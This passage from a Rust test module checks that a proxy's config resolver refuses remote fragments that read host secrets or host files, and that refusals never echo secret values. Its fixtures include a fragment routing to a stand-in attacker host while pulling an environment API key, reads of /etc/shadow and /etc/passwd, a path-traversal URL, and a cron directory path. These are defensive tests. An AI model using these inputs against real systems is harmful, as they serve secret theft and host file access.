        .expect_err("a synthesized `{{env.X}}` must be refused");
        match &error {
            ConfinedTemplateError::EnvTemplate { variable, .. } => {
                assert_eq!(variable, SECRET_VAR);
            }
            other => panic!("expected an EnvTemplate refusal, got {other:?}"),
        }
        assert!(!error.to_string().contains(SECRET_VALUE));
    }

    #[test]
    fn a_yaml_tag_in_a_fragment_is_refused_naming_the_fragment() {
        let error = resolve_confined_fragment(
            "acme/api",
            "password: !env ADMIN_PASSWORD\n",
            &bindings(&[]),
        )
        .expect_err("a tag is stripped by the parser and must not reach a value");
        match &error {
            ConfinedTemplateError::YamlTag {
                fragment,
                tag,
                path,
                ..
            } => {
                assert_eq!(fragment, "acme/api");
                assert_eq!(tag, "!env");
                assert_eq!(path, "password");
            }
            other => panic!("expected a YamlTag refusal, got {other:?}"),
        }
    }

    #[test]
    fn a_fragment_may_not_use_a_host_backed_secret_reference() {
        let _env = secret_env();
        // The attack the template scan cannot see. No `${`, no `{{`, and
        // the process resolver reads it straight out of the environment
        // at config load. Same shape as `examples/keys-inbound-headers`.
        for (value, form_name) in [
            (format!("env:{SECRET_VAR}"), "env:NAME"),
            (format!("vault://env/{SECRET_VAR}"), "vault://env/NAME"),
            ("file:/etc/sbproxy/aws-creds".to_string(), "file:PATH"),
            // The same read spelled as a URL. `strip_prefix("file:")`
            // hands the resolver `///etc/...`, which POSIX resolves to
            // `/etc/...`, so a mirror that skipped `file://` would have
            // refused one spelling and passed the other.
            ("file:///etc/sbproxy/aws-creds".to_string(), "file:PATH"),
            // Leading whitespace does not smuggle one past either.
            (format!("  env:{SECRET_VAR}"), "env:NAME"),
        ] {
            let fragment = serde_yaml::to_string(&serde_json::json!({
                "action": { "type": "proxy", "url": "https://collect.attacker.example" },
                "authentication": { "type": "api_key", "api_key": value },
            }))
            .expect("fixture serializes");
            let error = match resolve_confined_fragment("acme/api", &fragment, &bindings(&[])) {
                Ok(resolved) => panic!("`{value}` must be refused, resolved to {resolved}"),
                Err(error) => error,
            };
            match &error {
                ConfinedTemplateError::HostSecretReference {
                    form, path: field, ..
                } => {
                    assert_eq!(*form, form_name);
                    assert_eq!(field, "authentication.api_key");
                }
                other => {
                    panic!("expected a HostSecretReference refusal for `{value}`, got {other:?}")
                }
            }
            assert!(!error.to_string().contains(SECRET_VALUE));
        }
    }

    /// WOR-2433, after CI's secret-resolver drift guard. A detector must
    /// be as wide as the enforcer, so the property is stated over the
    /// shared table rather than over a handful of literals: every prefix
    /// `SecretResolver::resolve_with_limit` reads off this host is one
    /// the confined pass refuses, in value position and in mapping-key
    /// position, under both the sealed and the remote-document policies,
    /// and with whitespace around it. A prefix added to
    /// `HOST_BACKED_SECRET_PREFIXES` that the confined walk does not
    /// refuse fails here.
    #[test]
    fn every_host_backed_prefix_the_resolver_reads_is_refused() {
        assert!(
            !crate::types::HOST_BACKED_SECRET_PREFIXES.is_empty(),
            "an empty table would make every assertion below vacuous",
        );
        for (prefix, _) in crate::types::HOST_BACKED_SECRET_PREFIXES {
            for reference in [
                format!("{prefix}SB_SECRET_2433"),
                format!("  {prefix}SB_SECRET_2433"),
                format!("{prefix}SB_SECRET_2433\t"),
            ] {
                for policy in [
                    ConfinementPolicy::remote_document(),
                    ConfinementPolicy::bundle_manifest(),
                ] {
                    // Value position.
                    let document = format!(
                        "origins:\n  api:\n    authentication:\n      type: api_key\n      api_key: {reference:?}\n"
                    );
                    let error = check_confined_document("acme/runtime-config", &document, &policy)
                        .expect_err("the resolver reads this off the host, so it must be refused");
                    assert!(
                        matches!(
                            error,
                            ConfinedTemplateError::HostSecretReference { .. }
                                | ConfinedTemplateError::SecretReference { .. }
                        ),
                        "`{reference}` was refused as {error:?}, not as a secret reference",
                    );
                    assert!(
                        !error.to_string().contains("SB_SECRET_2433"),
                        "the refusal echoed the reference: {error}",
                    );

                    // Mapping-key position, which the pre-parse pass
                    // substitutes into just as readily.
                    let document =
                        format!("origins:\n  api:\n    request_headers:\n      {reference:?}: v\n");
                    check_confined_document("acme/runtime-config", &document, &policy)
                        .expect_err("a reference in key position is still a host read");
                }
            }
        }
    }

    #[test]
    fn a_host_backed_secret_reference_names_the_form_and_never_the_value() {
        let _env = secret_env();
        let fragment =
            format!("authentication:\n  type: api_key\n  api_key: \"env:{SECRET_VAR}\"\n");
        let error = resolve_confined_fragment("acme/api", &fragment, &bindings(&[]))
            .expect_err("`env:NAME` reads the process environment and must be refused");
        match &error {
            ConfinedTemplateError::HostSecretReference {
                fragment,
                path,
                form,
                reads,
            } => {
                assert_eq!(fragment, "acme/api");
                assert_eq!(path, "authentication.api_key");
                assert_eq!(*form, "env:NAME");
                assert_eq!(*reads, "the process environment");
            }
            other => panic!("expected a HostSecretReference refusal, got {other:?}"),
        }
        let rendered = error.to_string();
        assert!(
            !rendered.contains(SECRET_VALUE),
            "the refusal echoed the variable's value: {rendered}"
        );
        // Not even the variable NAME: the author wrote it, and the field
        // path is the pointer they need.
        assert!(!rendered.contains(SECRET_VAR), "{rendered}");
    }

    #[test]
    fn an_operator_declared_backend_reference_still_resolves_in_a_fragment() {
        // The refusal is scoped to references that read this host
        // directly. A backend named under `proxy.secrets` is the
        // operator's own declaration, and a fragment cannot set
        // `proxy.secrets`, so naming one is not a fragment-controlled
        // read.
        for value in [
            "secret://acme/openai",
            "vault://acme-vault/openai",
            "awssm://aws/prod-key",
            "k8ssecret://k8s/ns/name",
        ] {
            let fragment = serde_yaml::to_string(&serde_json::json!({
                "authentication": { "type": "api_key", "api_key": value },
            }))
            .expect("fixture serializes");
            resolve_confined_fragment("acme/api", &fragment, &bindings(&[]))
                .unwrap_or_else(|error| panic!("`{value}` must still resolve, got {error}"));
        }
    }

    #[test]
    fn a_fragment_may_not_inline_a_host_file_by_path() {
        for key in ["rego_module_path", "module_path"] {
            let fragment = serde_yaml::to_string(&serde_json::json!({
                "request_modifiers": [{ key: "/etc/sbproxy/anything.rego" }],
            }))
            .expect("fixture serializes");
            let error = match resolve_confined_fragment("acme/api", &fragment, &bindings(&[])) {
                Ok(resolved) => {
                    panic!("`{key}` names a host path and must be refused, resolved to {resolved}")
                }
                Err(error) => error,
            };
            match &error {
                ConfinedTemplateError::HostFileInlining { path, remedy, .. } => {
                    assert_eq!(path, &format!("request_modifiers.0.{key}"));
                    assert!(
                        remedy.contains("module"),
                        "the remedy must name a key that exists on this module: {remedy}"
                    );
                }
                other => panic!("expected a HostFileInlining refusal, got {other:?}"),
            }
        }
    }

    /// Every entry in [`HOST_FILE_KEYS`], written out by hand, in the
    /// shape the real config has: the sequence keys as sequences, the
    /// scoped keys under the parent that scopes them.
    ///
    /// Literal rather than derived from the list, which is the point.
    /// The previous version of this test iterated `HOST_FILE_KEYS`
    /// itself, so it passed on the two-entry list it was written to
    /// widen and would keep passing if an entry were deleted
    /// (WOR-2433 re-review). Deleting an entry now goes red here, and
    /// adding one without a case goes red on the count assertion below.
    const REFUSED_HOST_FILE_DOCUMENTS: &[(&str, &str)] = &[
        (
            "rego_module_path",
            "origins:\n  api:\n    request_modifiers:\n      - rego_module_path: /etc/sbproxy/x.rego\n",
        ),
        (
            "module_path",
            "origins:\n  api:\n    transforms:\n      - type: wasm\n        module_path: /etc/sbproxy/x.wasm\n",
        ),
        (
            "spec_file",
            "origins:\n  api:\n    policies:\n      - type: openapi_validation\n        spec_file: /etc/sbproxy/openapi.yaml\n",
        ),
        (
            "sha1_file",
            "origins:\n  api:\n    policies:\n      - type: exposed_credentials\n        sha1_file: /etc/shadow\n",
        ),
        (
            "transcode.descriptor_set",
            "origins:\n  api:\n    action:\n      type: grpc\n      transcode:\n        descriptor_set: /etc/sbproxy/x.pb\n",
        ),
        (
            "bulk_list.path",
            "origins:\n  api:\n    action:\n      type: redirect\n      bulk_list:\n        type: file\n        path: /etc/passwd\n",
        ),
        (
            "feed.cache_dir",
            "origins:\n  api:\n    policies:\n      - type: waf\n        feed:\n          cache_dir: /etc/cron.d\n",
        ),
        (
            "feed.cache_file",
            "origins:\n  api:\n    policies:\n      - type: waf\n        feed:\n          cache_file: /etc/cron.d/sbproxy\n",
        ),
        (
            "spec_path",
            "origins:\n  api:\n    action:\n      type: mcp\n      federated_servers:\n        - origin: upstream\n          spec_path: /etc/sbproxy/openapi.json\n",
        ),
        (
            "argument_policies.path",
            "origins:\n  api:\n    action:\n      type: mcp\n      argument_policies:\n        - name: guard\n          path: /etc/sbproxy/guard.rego\n",
        ),
        (
            "result_policies.path",
            "origins:\n  api:\n    action:\n      type: mcp\n      result_policies:\n        - name: guard\n          path: /etc/sbproxy/guard.rego\n",
        ),
        (
            "agent_skills.path",
            "agent_skills:\n  - name: skill\n    url: https://example.test/skill.md\n    path: /etc/passwd\n",
        ),
        (
            "agent_skills.url",
            "agent_skills:\n  - name: skill\n    url: /../../../../etc/passwd\n",
        ),
        (
            "action.path",
            "origins:\n  api:\n    action:\n      type: storage\n      backend: local\n      path: /\n",
        ),
        (
            "tool_versioning.lockfile",
            "origins:\n  api:\n    action:\n      type: mcp\n      tool_versioning:\n        lockfile: /etc/sbproxy/mcp.lock\n",
        ),
        (
            "grant_ledger.path",
            "origins:\n  api:\n    action:\n      type: mcp\n      grant_ledger:\n        path: /etc/sbproxy/mcp-grants.json\n      federated_servers:\n        - origin: upstream\n",
        ),
        (
            "approval.store",
            "origins:\n  api:\n    action:\n      type: mcp\n      approval:\n        store: /etc/sbproxy/mcp-approvals.json\n      federated_servers:\n        - origin: upstream\n",
        ),
        (
            "model_path",
            "origins:\n  api:\n    action:\n      type: proxy\n      semantic_cache:\n        inprocess:\n          model_path: /etc/sbproxy/embed.onnx\n",
        ),
        (
            "tokenizer_path",
            "origins:\n  api:\n    ai:\n      guardrails:\n        classifier:\n          backend:\n            tokenizer_path: /etc/sbproxy/tokenizer.json\n",
        ),
        (
            "detector_config.model_signature_path",
            "origins:\n  api:\n    policies:\n      - type: prompt_injection_v2\n        detector_config:\n          model_signature_path: /etc/sbproxy/model.sig\n",
        ),
        (
            "detector_config.tokenizer_signature_path",
            "origins:\n  api:\n    policies:\n      - type: prompt_injection_v2\n        detector_config:\n          tokenizer_signature_path: /etc/sbproxy/tokenizer.sig\n",
        ),
        (
            "agent_detect.rule_pack_path",
            "proxy:\n  extensions:\n    agent_detect:\n      rule_pack_path: /etc/sbproxy/agents.yaml\n",
        ),
        (
            "agent_detect.onnx_model_path",
            "proxy:\n  extensions:\n    agent_detect:\n      onnx_model_path: /etc/sbproxy/agents.onnx\n",
        ),
        (
            "geoip.database_path",
            "origins:\n  api:\n    policies:\n      - type: geoip\n        database_path: /opt/geoip/GeoLite2-City.mmdb\n",
        ),
        (
            "extensions.bundles_dir",
            "extensions:\n  bundles_dir: /etc/sbproxy/bundles\n",
        ),
        (
            "sources.path",
            "extensions:\n  sources:\n    - type: directory\n      path: /etc/sbproxy/bundles\n",
        ),
        (
            "tls_cert_file",
            "proxy:\n  tls_cert_file: /etc/sbproxy/tls.crt\n",
        ),
        (
            "tls_key_file",
            "proxy:\n  tls_key_file: /etc/sbproxy/tls.key\n",
        ),
        (
            "cert_file",
            "proxy:\n  config_authority:\n    publish:\n      tls:\n        cert_file: /etc/sbproxy/authority.crt\n",
        ),
        (
            "key_file",
            "proxy:\n  l2_cache_settings:\n    params:\n      key_file: /etc/sbproxy/redis.key\n",
        ),
        (
            "ca_file",
            "proxy:\n  key_management:\n    cache:\n      mesh:\n        peer_tls:\n          ca_file: /etc/sbproxy/mesh-ca.crt\n",
        ),
        (
            "client_ca_file",
            "proxy:\n  mtls:\n    client_ca_file: /etc/sbproxy/clients.pem\n",
        ),
        (
            "tls.cert",
            "proxy:\n  admin:\n    tls:\n      cert: /etc/sbproxy/admin.crt\n",
        ),
        (
            "tls.key",
            "proxy:\n  admin:\n    tls:\n      key: /etc/sbproxy/admin.key\n",
        ),
        (
            "authority_dir",
            "proxy:\n  cluster:\n    enrollment:\n      authority_dir: /etc/sbproxy/authority\n",
        ),
        (
            "signing_key_file",
            "proxy:\n  cluster:\n    deployment_authority:\n      signing_key_file: /etc/sbproxy/sign.key\n",
        ),
        (
            "verifying_key_file",
            "proxy:\n  cluster:\n    deployment_authority:\n      verifying_key_file: /etc/sbproxy/verify.pub\n",
        ),
        (
            "verifying_keys_file",
            "proxy:\n  config_authority:\n    upstream:\n      verifying_keys_file: /etc/sbproxy/trusted-keys.json\n",
        ),
        (
            "signing_key.pem_file",
            "proxy:\n  federation:\n    signing_key:\n      pem_file: /etc/sbproxy/federation-signing.pem\n",
        ),
        (
            "state_dir",
            "proxy:\n  cluster:\n    state_dir: /var/lib/sbproxy\n",
        ),
        (
            "state_path",
            "proxy:\n  payments:\n    state_path: /var/lib/sbproxy/payments.sqlite\n",
        ),
        (
            "store_dir",
            "proxy:\n  config_authority:\n    publish:\n      store_dir: /var/lib/sbproxy/authority\n",
        ),
        (
            "store.path",
            "proxy:\n  key_management:\n    store:\n      backend: embedded\n      path: /etc/sbproxy/keys.redb\n",
        ),
        (
            "model_host.store_path",
            "proxy:\n  model_host:\n    store_path: /var/lib/sbproxy/models\n",
        ),
        (
            "catalog_file",
            "proxy:\n  model_host:\n    catalog_file: /etc/sbproxy/catalog.yaml\n",
        ),
        (
            "serve.cache_dir",
            "origins:\n  api:\n    ai:\n      providers:\n        - name: local\n          serve:\n            cache_dir: /var/lib/sbproxy/weights\n",
        ),
        (
            "acquire.path",
            "origins:\n  api:\n    ai:\n      providers:\n        - name: local\n          serve:\n            engines:\n              llama_cpp:\n                acquire:\n                  source: path\n                  path: /usr/local/bin/llama-server\n",
        ),
        (
            "lora_adapters.source",
            "origins:\n  api:\n    ai:\n      providers:\n        - name: local\n          serve:\n            models:\n              - name: m\n                lora_adapters:\n                  - name: a\n                    source: /etc/sbproxy/adapter\n",
        ),
        (
            "cache.directory",
            "proxy:\n  model_host:\n    cache:\n      directory: /var/cache/sbproxy/models\n",
        ),
        (
            "engines.path",
            "proxy:\n  model_host:\n    engines:\n      vllm:\n        path: /usr/local/bin/vllm\n",
        ),
        (
            "socket_path",
            "proxy:\n  payments:\n    rails:\n      lightning_cln:\n        socket_path: /run/lightning/lightning-rpc\n",
        ),
        (
            "tls_certificate_path",
            "proxy:\n  payments:\n    rails:\n      lightning_lnd:\n        tls_certificate_path: /var/lib/lnd/tls.cert\n",
        ),
        (
            "jwt_path",
            "proxy:\n  secrets:\n    backends:\n      - type: gcp\n        name: gcp\n        auth:\n          jwt_path: /var/run/secrets/token\n",
        ),
        (
            "auth.path",
            "proxy:\n  secrets:\n    backends:\n      - type: k8s\n        name: k8s\n        auth:\n          type: kubeconfig\n          path: /etc/sbproxy/kubeconfig\n",
        ),
        (
            "service_account_key_file.path",
            "proxy:\n  secrets:\n    backends:\n      - type: gcp\n        name: gcp\n        auth:\n          service_account_key_file:\n            path: /etc/sbproxy/gcp.json\n",
        ),
        (
            "external_account_file.path",
            "proxy:\n  secrets:\n    backends:\n      - type: gcp\n        name: gcp\n        auth:\n          external_account_file:\n            path: /etc/sbproxy/external.json\n",
        ),
        (
            "backends.path",
            "proxy:\n  secrets:\n    backends:\n      - type: file\n        name: files\n        path: /etc/sbproxy/secrets.yml\n",
        ),
        (
            "proxy.ai_providers_file",
            "proxy:\n  ai_providers_file: /etc/sbproxy/providers.yaml\n",
        ),
        (
            "audit.path",
            "audit:\n  sink: chain\n  path: /var/lib/sbproxy/audit.chain\n",
        ),
        (
            "audit.config_path",
            "audit:\n  sink: chain\n  config_path: /var/lib/sbproxy/config-audit.chain\n",
        ),
        (
            "audit.key_path",
            "audit:\n  sink: chain\n  key_path: /var/lib/sbproxy/key-audit.chain\n",
        ),
        (
            "audit.admin_path",
            "audit:\n  sink: chain\n  admin_path: /var/lib/sbproxy/admin-audit.chain\n",
        ),
        (
            "output.path",
            "access_log:\n  output:\n    type: file\n    path: /var/log/sbproxy/access.log\n",
        ),
        (
            "events.path",
            "events:\n  sink: file\n  path: /var/log/sbproxy/events.ndjson\n",
        ),
        (
            "request_events.path",
            "request_events:\n  sink: file\n  path: /var/log/sbproxy/requests.ndjson\n",
        ),
        (
            "session_ledger.path",
            "session_ledger:\n  sink: file\n  path: /var/log/sbproxy/sessions.ndjson\n",
        ),
        (
            "usage_rollups.path",
            "proxy:\n  observability:\n    usage_rollups:\n      path: /var/lib/sbproxy/usage-rollups.redb\n",
        ),
        (
            "usage_sinks.path",
            "origins:\n  api:\n    ai:\n      usage_sinks:\n        - type: jsonl_file\n          path: /etc/sbproxy/usage.jsonl\n",
        ),
        (
            "ledger.path",
            "proxy:\n  attestation:\n    ledger:\n      path: /var/lib/sbproxy/attestation.ledger\n",
        ),
        (
            "queue.path",
            "proxy:\n  attestation:\n    queue:\n      path: /var/lib/sbproxy/attestation.queue\n",
        ),
        (
            "config_history.dir",
            "proxy:\n  config_history:\n    dir: /var/lib/sbproxy/config-history\n",
        ),
        (
            "revocation_store.path",
            "origins:\n  api:\n    olp:\n      introspect:\n        revocation_store:\n          type: redb\n          path: /var/lib/sbproxy/revocations.redb\n",
        ),
        (
            "cache_path",
            "proxy:\n  config_authority:\n    upstream:\n      cache_path: /var/lib/sbproxy/bundle.json\n",
        ),
        (
            "storage_path",
            "proxy:\n  acme:\n    storage_path: /var/lib/sbproxy/acme\n",
        ),
        (
            "acme.ca_root",
            "proxy:\n  acme:\n    ca_root: /etc/sbproxy/acme-root.pem\n",
        ),
        (
            "levers.endpoint",
            "origins:\n  api:\n    action:\n      type: ai_proxy\n      compression:\n        levers:\n          - type: token_prune\n            endpoint: unix:///run/sbproxy/classifier.sock\n",
        ),
        (
            "compression_state.local_path",
            "proxy:\n  compression_state:\n    local_path: /var/lib/sbproxy/compression.redb\n",
        ),
        (
            "prompt_persistence_path",
            "proxy:\n  admin:\n    prompt_persistence_path: /var/lib/sbproxy/prompts.redb\n",
        ),
        (
            "backend.path",
            "proxy:\n  cache_reserve:\n    backend:\n      type: filesystem\n      path: /etc/sbproxy/reserve\n",
        ),
        (
            "agent_registry.store_path",
            "proxy:\n  agent_registry:\n    store_path: /var/lib/sbproxy/agent-registry.redb\n",
        ),
        (
            "agent_registry.feed_path",
            "proxy:\n  agent_registry:\n    feed_path: /var/lib/sbproxy/agents/feed.json\n",
        ),
        (
            "agent_registry.key_directory_path",
            "proxy:\n  agent_registry:\n    key_directory_path: /var/lib/sbproxy/agents/keys.json\n",
        ),
        (
            "notifications.store_path",
            "proxy:\n  notifications:\n    store_path: /var/lib/sbproxy/notifications.redb\n",
        ),
        (
            "request_events.watermark_store_path",
            "request_events:\n  watermark_store_path: /var/lib/sbproxy/event-ingest.redb\n",
        ),
    ];

    #[test]
    fn a_document_naming_a_host_file_key_is_refused() {
        assert_eq!(
            REFUSED_HOST_FILE_DOCUMENTS.len(),
            HOST_FILE_KEYS.len(),
            "every HOST_FILE_KEYS entry needs a literal case here, and every case an entry",
        );
        for (name, document) in REFUSED_HOST_FILE_DOCUMENTS {
            let error = match check_confined_document(
                "acme/runtime-config",
                document,
                &ConfinementPolicy::remote_document(),
            ) {
                Ok(()) => panic!("`{name}` opens a host path and must be refused"),
                Err(error) => error,
            };
            match &error {
                ConfinedTemplateError::HostFileInlining { path, remedy, .. } => {
                    let key = name.rsplit('.').next().expect("a key name");
                    assert!(
                        path.ends_with(key),
                        "`{name}` was refused at `{path}`, which is not the key it names",
                    );
                    assert!(!remedy.is_empty(), "`{name}` has no remedy");
                    // A `remedy` is interpolated into the operator-facing
                    // refusal, so a literal written across two source
                    // lines without a `\`-continuation ships the source
                    // indentation as a run of spaces. Three of these
                    // entries did exactly that, and the emptiness check
                    // above could not see it.
                    assert!(
                        !remedy.contains("  "),
                        "`{name}`'s remedy carries a run of spaces where a line \
                         continuation was meant: {remedy}",
                    );
                }
                other => panic!("expected a HostFileInlining refusal for `{name}`, got {other:?}"),
            }
            assert!(
                !error.to_string().contains("/etc/passwd"),
                "the refusal echoed the path it refused: {error}",
            );
        }
    }

    /// The path markers the schema sweep looks for in a property
    /// **name**, exactly as the `HOST_FILE_KEYS` doc states them.
    /// Matched as substrings, which is why `compression_profile` is
    /// path-shaped by this rule.
    const SCHEMA_PATH_MARKERS: &[&str] = &[
        "path", "file", "dir", "_dir", "ca_file", "key_file", "cert", "socket", "log", "sink",
    ];

    /// The stems that make a property **description** path-shaped.
    ///
    /// The second signal, and the reason it exists: a name-only
    /// detector is exactly as wide as its marker list, and
    /// `proxy.acme.ca_root` is a PEM this process reads off the disk
    /// whose name carries no marker at all (WOR-2433 re-review round 4).
    /// Matched at a word boundary and as a prefix, so `file`, `files`,
    /// `filesystem`, `path`, `paths`, `directory`, `directories`,
    /// `socket` all count and `profile` does not.
    const SCHEMA_PATH_DESCRIPTION_STEMS: &[&str] = &["file", "path", "director", "socket"];

    /// Every schema this repository generates, with the config path its
    /// root sits at.
    ///
    /// All six are regenerated and diffed by
    /// `scripts/check-config-schema.sh` on every PR, so a type change
    /// that adds a host path has to move one of these files and the
    /// sweep runs over whatever moved. Sweeping only the first one is
    /// how `origins.*.ai.providers[].serve` - an engine binary this node
    /// executes - stayed uncovered for three rounds: the AI blocks are
    /// untyped in `sb-config.schema.json` and fully typed here
    /// (WOR-2433 re-review round 4).
    const GENERATED_SCHEMAS: &[(&str, &str)] = &[
        ("sb-config.schema.json", ""),
        ("ai-proxy-provider.schema.json", "origins.*.ai.providers[]"),
        ("ai-compression.schema.json", "origins.*.action.compression"),
        (
            "ai-external-guardrail.schema.json",
            "origins.*.ai.guardrails.external[]",
        ),
        ("ai-rag.schema.json", "origins.*.action.rag"),
        (
            "ai-semantic-cache.schema.json",
            "origins.*.action.semantic_cache",
        ),
    ];

    /// Schema properties the sweep calls path-shaped and whose **value**
    /// is not a path on this host, each with the reason it is not on
    /// `HOST_FILE_KEYS`.
    ///
    /// Two signals means two sources of noise. The name markers are
    /// substrings, so `compression_profile` and `profile` match `file`,
    /// `directory_url` matches `dir`, and `catalog` matches `log`. The
    /// description stems catch every key whose prose mentions a file or
    /// a path for any reason, which is most of the HTTP routing
    /// vocabulary and every secret reference whose doc lists the `file:`
    /// scheme. That noise is the price of catching a `ca_root`, and it
    /// is paid here, once, in writing.
    ///
    /// An entry here that the sweep no longer finds fails the test too,
    /// so a key that is renamed or deleted cannot leave a stale excuse
    /// behind.
    const SCHEMA_KEYS_THAT_ARE_NOT_HOST_PATHS: &[(&str, &str)] = &[
        // --- the sink kind, next to the sink path -------------------
        (
            "access_log.output.type",
            "the sink kind (`stderr` | `file`); the path is `access_log.output.path`",
        ),
        (
            "proxy.config_history.boot.fallback",
            "the boot fallback mode (`off` | `last_known_good`); the ring it reads from is \
             `proxy.config_history.dir`",
        ),
        (
            "proxy.acme.storage_backend",
            "the store kind (`redb` | `sqlite` | `file` | `redis` | `s3` | `gcs` | `azure` \
             | `memory`); the location is `proxy.acme.storage_path`",
        ),
        (
            "proxy.secrets.backends[].format",
            "`File format.`, meaning `yaml` or `json`; the file is `backends[].path`",
        ),
        // --- HTTP routing vocabulary ---------------------------------
        (
            "origins.*.forward_rules[].rules[].match",
            "an HTTP prefix match, the shorthand for `path: { prefix: ... }`",
        ),
        (
            "origins.*.forward_rules[].rules[].path.exact",
            "an exact HTTP request path this rule matches",
        ),
        (
            "origins.*.forward_rules[].rules[].path.prefix",
            "an HTTP request-path prefix this rule matches",
        ),
        (
            "origins.*.forward_rules[].rules[].path.regex",
            "a regex over the HTTP request path",
        ),
        (
            "origins.*.forward_rules[].rules[].path.template",
            "an OpenAPI-style HTTP path template with named segments",
        ),
        (
            "origins.*.forward_rules[].parameters[].in",
            "where a parameter appears (`path` | `query` | `header`), not a path",
        ),
        (
            "origins.*.forward_rules[].parameters[].name",
            "the parameter name; its description mentions path params",
        ),
        // --- key-service coordinates that are not host paths ---------
        (
            "proxy.key_management.crypto.root_of_trust.mount",
            "the Transit mount path *inside the key service*, for example `transit`. It is a \
             segment of a URL this proxy dials, never a file on this host, and the confined \
             template has nothing to confine it to",
        ),
        (
            "proxy.key_management.crypto.root_of_trust.token",
            "a secret reference for the key-service token (`env:`, `file:`, `vault://`). The \
             `file:` form names a host file and is resolved by the shared secret resolver, \
             which applies its own confinement; the field itself is a reference, not a path",
        ),
        // --- URLs and network endpoints ------------------------------
        (
            "origins.*.action.semantic_cache.openai.base_url",
            "an `https://` base URL for the embedding API",
        ),
        (
            "proxy.config_authority.upstream.url",
            "the authority's absolute base URL; the subscriber appends its own path",
        ),
        (
            "origins.*.observability.log.sinks[].output.endpoint",
            "an OTLP collector URL",
        ),
        (
            "proxy.observability.log.sinks[].output.endpoint",
            "an OTLP collector URL",
        ),
        (
            "proxy.tenants[].observability.log.sinks[].output.endpoint",
            "an OTLP collector URL",
        ),
        // --- names inside somebody else's namespace ------------------
        (
            "origins.*.action.rag.vector_store.database",
            "a Chroma database name that appears in its collection path, not a path here",
        ),
        (
            "origins.*.action.rag.vector_store.database_tenant",
            "a Chroma tenant name that appears in its collection path",
        ),
        (
            "proxy.secrets.backends[].mount",
            "a KV mount inside the secret provider, never opened on this filesystem",
        ),
        (
            "proxy.secrets.backends[].mount_prefix",
            "a KV prefix inside the secret provider that every read must stay inside",
        ),
        ("proxy.secrets.hashicorp.mount", "a Vault KV engine mount"),
        (
            "proxy.key_management.store.secrets_manager.mount",
            "a KV mount (`hashicorp`) or key prefix (`aws`) inside the provider",
        ),
        (
            "origins.*.ai.providers[].serve.models[].gguf_file",
            "the exact GGUF filename inside a multi-file Hugging Face repo, resolved \
             remotely; the local cache it lands in is `serve.cache_dir`, which is on the \
             list",
        ),
        (
            "origins.*.ai.providers[].aws_sigv4.credentials.profile",
            "a named profile in the shared AWS config; the SDK, not this value, decides \
             which file that is",
        ),
        (
            "proxy.attestation.sign_with",
            "a *config* path naming an existing signing identity, not a filesystem path",
        ),
        (
            "proxy.attestation.route_weights[].name",
            "the unit name on the invoice line; its description mentions the route path",
        ),
        // --- inline bodies, which are the remedies this list offers ---
        (
            "origins.*.agent_skills[].body",
            "the inline artifact body, which is exactly what `agent_skills[].path` and \
             `agent_skills[].url` are told to use instead",
        ),
        (
            "origins.*.error_pages[].body",
            "the inline response body; its description mentions `request.path`",
        ),
        // --- secret material, screened by the secret rules -----------
        (
            "origins.*.credentials[].key",
            "secret material or a provider reference; the `file:` spelling its doc lists \
             is refused by the host-backed secret rule, not by this list",
        ),
        (
            "proxy.credentials[].key",
            "secret material or a provider reference; screened by the host-backed secret \
             rule",
        ),
        (
            "proxy.tenants[].credentials[].key",
            "secret material or a provider reference; screened by the host-backed secret \
             rule",
        ),
        (
            "origins.*.outbound_credential.dpop.key",
            "a provider URI or `file:` secret reference; screened by the host-backed \
             secret rule",
        ),
        (
            "origins.*.ai.providers[].aws_sigv4.credentials.secret_access_key",
            "an AWS secret access key, resolved through the secret rules",
        ),
        (
            "origins.*.ai.providers[].aws_sigv4.credentials.external_id",
            "an STS external id held as a credential",
        ),
        (
            "origins.*.web_bot_auth_publish.signing_key_hex",
            "a hex-encoded Ed25519 seed carried inline, not a file",
        ),
        (
            "source.credential",
            "a credential reference for the repository; its `file:` spelling is refused \
             by the host-backed secret rule",
        ),
        // --- log field values and enums ------------------------------
        (
            "origins.*.observability.log.custom_fields[].value",
            "a log field value with `${...}` interpolation, screened by the environment \
             rules",
        ),
        (
            "proxy.observability.log.custom_fields[].value",
            "a log field value with `${...}` interpolation",
        ),
        (
            "proxy.tenants[].observability.log.custom_fields[].value",
            "a log field value with `${...}` interpolation",
        ),
        (
            "proxy.payments.usage_reporters.stripe_meter.failure_posture",
            "an enum for what the request path does when the enqueue fails",
        ),
        (
            "proxy.payments.usage_reporters.stripe_meter.source",
            "which request-path record is authoritative for the meter event",
        ),
        (
            "proxy.acme.email",
            "the ACME account contact email; its description mentions the directory",
        ),
        (
            "agent_classes.catalog",
            "matches `log` inside `catalog`; the value is a source selector \
             (`builtin` | `inline`), not a path",
        ),
        (
            "audit.sink",
            "the sink kind (`memory` | `chain`); the chain's path is `audit.path`",
        ),
        ("events.sink", "the sink kind; the path is `events.path`"),
        (
            "request_events.sink",
            "the sink kind; the path is `request_events.path`",
        ),
        (
            "session_ledger.sink",
            "the sink kind; the path is `session_ledger.path`",
        ),
        (
            "origins.*.credentials[].compression_profile",
            "matches `file` inside `profile`; the value is `on`, `off`, or a named \
             compression profile",
        ),
        (
            "proxy.credentials[].compression_profile",
            "matches `file` inside `profile`; a compression selector",
        ),
        (
            "proxy.tenants[].credentials[].compression_profile",
            "matches `file` inside `profile`; a compression selector",
        ),
        (
            "proxy.key_management.seed.keys[].compression_profile",
            "matches `file` inside `profile`; a compression selector",
        ),
        (
            "origins.*.observability.log.sinks[].profile",
            "matches `file` inside `profile`; the value is a redaction profile \
             (`internal` | `external`)",
        ),
        (
            "proxy.observability.log.sinks[].profile",
            "matches `file` inside `profile`; a redaction profile",
        ),
        (
            "proxy.tenants[].observability.log.sinks[].profile",
            "matches `file` inside `profile`; a redaction profile",
        ),
        (
            "origins.*.olp.introspect.introspect_path",
            "an HTTP route the endpoint binds to, not a filesystem path",
        ),
        (
            "origins.*.olp.introspect.revoke_path",
            "an HTTP route the endpoint binds to, not a filesystem path",
        ),
        (
            "proxy.attestation.route_weights[].path",
            "an HTTP route pattern this entry prices, not a filesystem path",
        ),
        (
            "proxy.synthetic_probe.path",
            "the HTTP path the synthetic readiness request is issued on",
        ),
        (
            "origins.*.web_bot_auth_publish.directory_url",
            "matches `dir` inside `directory_url`; an `https://` URL the agent card \
             points at",
        ),
        (
            "proxy.web_bot_auth.directory_url",
            "matches `dir` inside `directory_url`; a published key-directory URL",
        ),
        (
            "proxy.acme.directory_url",
            "matches `dir` inside `directory_url`; the ACME directory endpoint",
        ),
        (
            "proxy.classifier_hooks.tls.client_identity.cert_pem",
